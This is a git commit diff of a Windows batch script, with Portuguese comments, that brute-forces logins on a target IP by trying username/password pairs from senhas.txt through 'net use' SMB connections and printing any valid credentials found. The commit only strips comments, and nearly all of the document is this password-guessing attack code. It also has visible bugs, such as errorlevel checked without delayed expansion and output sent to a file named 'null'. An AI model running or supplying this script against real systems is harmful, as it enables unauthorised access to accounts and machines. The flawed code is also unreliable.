64f2aede885d776bb1b2f554f1757f0c58574e5a
Felipe Henrique <151560338+LipeOzyy@users.noreply.github.com>
2025-02-24 12:02:44 -0300

    .

--- script.bat
+++ script.bat
@@ -4,13 +4,9 @@
 ::defina aqui o IP alvo
 set "ip_alvo=<ip_alvo>"
 
-::faz a intera das linhas do arquivo senhas.txt, /f le o conteudo linha por linha
-::tokens=1,2 divide cada linha em dois elementos (separados por espaço, tabulação ou vírgula).
 for /f "tokens=1,2" %%i in (senhas.txt) do(
     echo Testando senha: %%i / %%j...
     net use \\%ip_alvo% %%j /user:%%i > null 2>&1
-::%i usuario, %j senha
-    ::verifica tudo
     if %errorlevel%==0 (
         echo [SUCESSO] credenciais validas: %%i / %%j
         exit /b 0
@@ -18,6 +14,5 @@ for /f "tokens=1,2" %%i in (senhas.txt) do(
         echo [FALHA] credenciais invalidas: %%i / %%j
     )
 )
-::se nao der certo
 echo todas as combinações falharam
 exit /b 1
